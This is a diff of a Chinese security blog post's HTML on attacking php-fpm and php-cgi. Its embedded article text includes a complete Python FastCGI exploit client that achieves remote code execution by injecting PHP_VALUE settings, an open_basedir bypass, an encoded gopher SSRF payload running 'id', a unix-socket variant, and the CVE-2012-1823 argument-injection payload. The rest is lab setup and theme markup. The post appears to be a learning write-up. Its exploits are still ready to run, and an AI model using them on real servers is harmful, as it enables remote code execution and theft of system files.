@@ -1,208 +1,172 @@
-
 <!DOCTYPE html>
 <html lang="zh-cn">
-    
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hexo">
-    <title>php-fpm&amp;&amp;cgi - Hexo</title>
-    <meta name="author" content="John Doe">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
     
-    
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\nFPM先看一下fpm是什么\n浏览器和服务器中间件之间用的是http协议 \n服务器中间件和后端语言之间用的就是fastcgi协议，而FPM就是fastcgi协议的一个协议解析器，nginx等中间件将用户请求，按照fastcgi协议打包好，通过tcp发给FPM\nFPM未授权访问漏洞fpm默认开启9000端口，如果这个端口暴露在公网上，那么就可以自己构造fastcgi协议和fpm通信。\n利用fpm中的一个配置选项，规定了那些文件可以被fpm执行\n1security.limit_extensions\n\n默认是*.php\n所以就要先找到一个php文件，文件内容不重要，因为fpm中还可以设置\n12auto_prepend_file //在文件加载前 包含指定文件auto_append_file  //在文件加载后 包含指定文件\n\n这两个选项经常在.htaccess 还有.user.ini中用到\n更改配置项把auto_prepend_file改为auto_prepend_file=php://input 就可以在文件加载前去执行post数据流，当然还要把\n1allow_url_include\n\n这个选项打开\nfpm中有两个环境变量\nPHP_VALUE\nPHP_ADMIN_VALUE\nPHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）\n代码执行12'PHP_VALUE': 'auto_prepend_file = php://input','PHP_ADMIN_VALUE': 'allow_url_include = On'\n\n绕过open_basedir12'PHP_VALUE': 'auto_prepend_file = php://input'+chr(0x0A)+'open_basedir = /','PHP_ADMIN_VALUE': 'allow_url_include = On'\n\n看一下脚本的执行结果\n123PS python3 .\\fpm.py 192.168.110.140 /usr/local/lib/php/PEAR.php -c '&lt;?php echo `cat /etc/passwd`;exit;?&gt;'X-Powered-By: PHP/7.3.9Content-type: text/html; charset=UTF-8\n\n附上exp\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode('utf-8', 'strict')def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, 'utf-8', 'strict')    else:        s = str(s)    return sclass FastCGIClient:    \"\"\"A Fast-CGI Client for Python\"\"\"    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \\               + bchr(fcgi_type) \\               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\               + bchr(requestid &amp; 0xFF) \\               + bchr((length &gt;&gt; 8) &amp; 0xFF) \\               + bchr(length &amp; 0xFF) \\               + bchr(0) \\               + bchr(0) \\               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b''        if nLen &lt; 128:            record += bchr(nLen)        else:            record += bchr((nLen &gt;&gt; 24) | 0x80) \\                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record += bchr(vLen)        else:            record += bchr((vLen &gt;&gt; 24) | 0x80) \\                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header['version'] = bord(stream[0])        header['type'] = bord(stream[1])        header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header['paddingLength'] = bord(stream[6])        header['reserved'] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record['content'] = b''                        if 'contentLength' in record.keys():                contentLength = int(record['contentLength'])                record['content'] += buffer.read(contentLength)            if 'paddingLength' in record.keys():                skiped = buffer.read(int(record['paddingLength']))            return record    def request(self, nameValuePairs=&#123;&#125;, post=''):        if not self.__connect():            print('connect failure! please check your fasctcgi-server !!')            return        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b\"\"        beginFCGIRecordContent = bchr(0) \\                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\                                 + bchr(self.keepalive) \\                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b''        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)        self.sock.send(request)        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND        self.requests[requestId]['response'] = b''        return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data = b''        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response['requestId']):                    self.requests[requestId]['response'] += response['content']            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId]['response']    def __repr__(self):        return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port)if __name__ == '__main__':    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')    parser.add_argument('host', help='Target host, such as 127.0.0.1')    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')    parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;')    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = \"/\"    uri = args.file    content = args.code    params = &#123;        'GATEWAY_INTERFACE': 'FastCGI/1.0',        'REQUEST_METHOD': 'POST',        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),        'SCRIPT_NAME': uri,        'QUERY_STRING': '',        'REQUEST_URI': uri,        'DOCUMENT_ROOT': documentRoot,        'SERVER_SOFTWARE': 'php/fcgiclient',        'REMOTE_ADDR': '127.0.0.1',        'REMOTE_PORT': '9985',        'SERVER_ADDR': '127.0.0.1',        'SERVER_PORT': '80',        'SERVER_NAME': \"localhost\",        'SERVER_PROTOCOL': 'HTTP/1.1',        'CONTENT_TYPE': 'application/text',        'CONTENT_LENGTH': \"%d\" % len(content),        'PHP_VALUE': 'auto_prepend_file = php://input',        'PHP_ADMIN_VALUE': 'allow_url_include = On'    &#125;    response = client.request(params, content)    print(force_text(response))\n\nssrf+fpm利用gopher协议\n先装环境ubuntu18\n123456sudo apt updatesudo apt install -y nginxsudo apt install -y software-properties-commonsudo add-apt-repository -y ppa:ondrej/phpsudo apt updatesudo apt install -y php7.3-fpm\n\n改配置nginx\n1234567891011sudo vim /etc/nginx/sites-enabled/default改成这样        location ~ \\.php$ &#123;                include snippets/fastcgi-php.conf;        #        #       # With php-fpm (or other unix sockets):        #       fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;        #       # With php-cgi (or other tcp sockets):                fastcgi_pass 127.0.0.1:9000;        &#125;\n\n再去改php-fpm的配置\n123sudo vim /etc/php/7.3/fpm/pool.d/www.conf改成这样listen = 127.0.0.1:9000\n\n重启fpm\n1/etc/init.d/php7.3-fpm restart\n\n启动nginx\n1service nginx start\n\n创建一个phpinfo文件\nphpin.php\n123&lt;?phpphpinfo();?&gt;\n\n用来查看是不是FPM/FASTCGI模式启动，正常情况下phpinfo里面会有这样一行\n1Server API \tFPM/FastCGI\n\n测试\nssrf.php\n1234567891011&lt;?phpfunction curl($url)&#123;                $ch = curl_init();                curl_setopt($ch, CURLOPT_URL, $url);                curl_setopt($ch, CURLOPT_HEADER, 0);                 curl_exec($ch);                curl_close($ch); &#125;$url = $_GET['url'];curl($url);?&gt;\n\n改一下p神的脚本，把发送数据那部分去掉\n1python &apos;gopherfpm.py&apos; 127.0.0.1 /var/www/html/phpin.php -c &apos;&lt;?php echo `id`; exit;?&gt;&apos; -p 9000\n\n生成数据\n1gopher%3A//127.0.0.1%3A9000/_%01%01%2C%04%00%08%00%00%00%01%00%00%00%00%00%00%01%04%2C%04%01%DB%00%00%0E%02CONTENT_LENGTH24%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/phpin.php%0B%17SCRIPT_NAME/var/www/html/phpin.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/phpin.php%01%04%2C%04%00%00%00%00%01%05%2C%04%00%18%00%00%3C%3Fphp%20echo%20%60id%60%3B%20exit%3B%3F%3E%01%05%2C%04%00%00%00%00\n\n这里要二次编码，注意只把后面的数据部分编码。gopher协议这里不要编码\n12GET /ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%252C%2504%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%252C%2504%2501%25DB%2500%2500%250E%2502CONTENT_LENGTH24%250C%2510CONTENT_TYPEapplication/text%250B%2504REMOTE_PORT9985%250B%2509SERVER_NAMElocalhost%2511%250BGATEWAY_INTERFACEFastCGI/1.0%250F%250ESERVER_SOFTWAREphp/fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250F%2517SCRIPT_FILENAME/var/www/html/phpin.php%250B%2517SCRIPT_NAME/var/www/html/phpin.php%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A//input%250E%2504REQUEST_METHODPOST%250B%2502SERVER_PORT80%250F%2508SERVER_PROTOCOLHTTP/1.1%250C%2500QUERY_STRING%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%250D%2501DOCUMENT_ROOT/%250B%2509SERVER_ADDR127.0.0.1%250B%2517REQUEST_URI/var/www/html/phpin.php%2501%2504%252C%2504%2500%2500%2500%2500%2501%2505%252C%2504%2500%2518%2500%2500%253C%253Fphp%2520echo%2520%2560id%2560%253B%2520exit%253B%253F%253E%2501%2505%252C%2504%2500%2500%2500%2500 HTTP/1.1Host: 192.168.110.145\n\nunix+fpm改一下配置 nginx\n1sudo vim /etc/nginx/sites-enabled/default\n\n改成这样\n12345678location ~ \\.php$ &#123;        include snippets/fastcgi-php.conf;##       # With php-fpm (or other unix sockets):        fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;#       # With php-cgi (or other tcp sockets):        #fastcgi_pass 127.0.0.1:9000;&#125;\n\n默认情况下，套接字的位置在/run/php/php7.3-fpm.sock\n可以通过/etc/php/7.3/fpm/pool.d/www.conf查看\n这里直接设置成/run/php/php7.3-fpm.sock\nsudo vim /etc/php/7.3/fpm/pool.d/www.conf\n12;listen = 127.0.0.1:9000listen = /run/php/php7.3-fpm.sock\n\n测试\nunix.php\n12345&lt;?php $sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');fputs($sock, base64_decode($_POST['A']));var_dump(fread($sock, 4096));?&gt;\n\n生成一下payload\n1python 'gopherfpm.py' 127.0.0.1 /var/www/html/phpin.php -c '&lt;?php echo `id`; exit;?&gt;' -p 9000\n\n访问unix， 把生成的base64数据post一下\nCGI当querystring中不包含没有解码的=号的情况下，要将querystring作为cgi的参数传入。所以，Apache服务器按要求实现了这个功能 也就是把输入的参数，当成了cgi的命令来执行\n常用的cgi参数有\n1234567-c 指定php.ini文件的位置-n 不要加载php.ini文件-d 指定配置项-b 启动fastcgi进程-s 显示文件源码-T 执行指定次该文件-h和-? 显示帮助\n\n测试\n1index.php?-s\n\n可以拿到源码\n利用-d 添加auto_prepend_file \n1/index.php?-d+allow_url_include%3Don+-d%20auto_prepend_file%3Dphp%3A//input\n\npost\n1&lt;?php system('id');?&gt;\n\n参考链接\nhttps://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\nhttps://vulhub.org/#/environments/php/CVE-2012-1823/\nhttps://mp.weixin.qq.com/s/ZvDkrlHn34eMWz_eFXeQmw\n","dateCreated":"2019-09-25T08:26:00+08:00","dateModified":"2019-09-28T18:21:17+08:00","datePublished":"2019-09-25T08:26:00+08:00","description":"","headline":"php-fpm&&cgi","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/25/php-fpm/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/25/php-fpm/"}</script>
-    <meta name="description" content="FPM先看一下fpm是什么 浏览器和服务器中间件之间用的是http协议  服务器中间件和后端语言之间用的就是fastcgi协议，而FPM就是fastcgi协议的一个协议解析器，nginx等中间件将用户请求，按照fastcgi协议打包好，通过tcp发给FPM FPM未授权访问漏洞fpm默认开启9000端口，如果这个端口暴露在公网上，那么就可以自己构造fastcgi协议和fpm通信。 利用fpm中">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="php-fpm&amp;&amp;cgi">
-<meta property="og:url" content="http://p1keman.github.io/2019/09/25/php-fpm/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="FPM先看一下fpm是什么 浏览器和服务器中间件之间用的是http协议  服务器中间件和后端语言之间用的就是fastcgi协议，而FPM就是fastcgi协议的一个协议解析器，nginx等中间件将用户请求，按照fastcgi协议打包好，通过tcp发给FPM FPM未授权访问漏洞fpm默认开启9000端口，如果这个端口暴露在公网上，那么就可以自己构造fastcgi协议和fpm通信。 利用fpm中">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-09-28T10:21:17.843Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php-fpm&amp;&amp;cgi">
-<meta name="twitter:description" content="FPM先看一下fpm是什么 浏览器和服务器中间件之间用的是http协议  服务器中间件和后端语言之间用的就是fastcgi协议，而FPM就是fastcgi协议的一个协议解析器，nginx等中间件将用户请求，按照fastcgi协议打包好，通过tcp发给FPM FPM未授权访问漏洞fpm默认开启9000端口，如果这个端口暴露在公网上，那么就可以自己构造fastcgi协议和fpm通信。 利用fpm中">
-    
-    
+    <title>
         
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
-    <!--STYLES END-->
-    
-
-    
-
-    
+            php-fpm&amp;&amp;cgi |
         
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-</head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
+<link rel="stylesheet" href="/css/style.css">
 
     
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/ "
-            aria-label=""
-        >
-            Hexo
-        </a>
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-        
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="打开链接: /#about"
-            >
-        
-        
-        </a>
-    
-</header>
 
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
-        
-        
-            <ul class="sidebar-buttons">
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="首页"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">首页</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="分类"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">分类</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="标签"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">标签</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="归档"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">归档</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="搜索"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">搜索</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="关于"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
             
         </ul>
-        
     </div>
-</nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
                 
-<article class="post">
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">php-fpm&amp;&amp;cgi</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2019-09-25 08:26:00
+    </span>
     
     
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            php-fpm&amp;&amp;cgi
-        </h1>
+
     
     
-        <div class="post-meta">
-    <time datetime="2019-09-25T08:26:00+08:00">
-	
-		    9月 25, 2019
-    	
-    </time>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-    
-</div>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
+        <div class="article-content markdown-body">
             <a id="more"></a>
 
 <h2 id="FPM"><a href="#FPM" class="headerlink" title="FPM"></a>FPM</h2><p>先看一下fpm是什么</p>
@@ -211,414 +175,330 @@
 <h2 id="FPM未授权访问漏洞"><a href="#FPM未授权访问漏洞" class="headerlink" title="FPM未授权访问漏洞"></a>FPM未授权访问漏洞</h2><p>fpm默认开启9000端口，如果这个端口暴露在公网上，那么就可以自己构造fastcgi协议和fpm通信。</p>
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>fpm中的一个配置选项，规定了那些文件可以被fpm执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security.limit_extensions</span><br></pre></td></tr></table></figure>
-
 <p>默认是*.php</p>
 <p>所以就要先找到一个php文件，文件内容不重要，因为fpm中还可以设置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file //在文件加载前 包含指定文件</span><br><span class="line">auto_append_file  //在文件加载后 包含指定文件</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file &#x2F;&#x2F;在文件加载前 包含指定文件</span><br><span class="line">auto_append_file  &#x2F;&#x2F;在文件加载后 包含指定文件</span><br></pre></td></tr></table></figure>
 <p>这两个选项经常在.htaccess 还有.user.ini中用到</p>
 <h3 id="更改配置项"><a href="#更改配置项" class="headerlink" title="更改配置项"></a>更改配置项</h3><p>把auto_prepend_file改为auto_prepend_file=php://input 就可以在文件加载前去执行post数据流，当然还要把</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include</span><br></pre></td></tr></table></figure>
-
 <p>这个选项打开</p>
 <p>fpm中有两个环境变量</p>
 <p>PHP_VALUE</p>
 <p>PHP_ADMIN_VALUE</p>
 <p><code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
-<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line"><span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br></pre></td></tr></table></figure>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>+chr(<span class="number">0x0A</span>)+<span class="string">'open_basedir = /'</span>,</span><br><span class="line"><span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>+chr(<span class="number">0x0A</span>)+<span class="string">&#x27;open_basedir = /&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>看一下脚本的执行结果</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS python3 .\fpm.py 192.168.110.140 /usr/<span class="built_in">local</span>/lib/php/PEAR.php -c <span class="string">'&lt;?php echo `cat /etc/passwd`;exit;?&gt;'</span></span><br><span class="line">X-Powered-By: PHP/7.3.9</span><br><span class="line">Content-type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
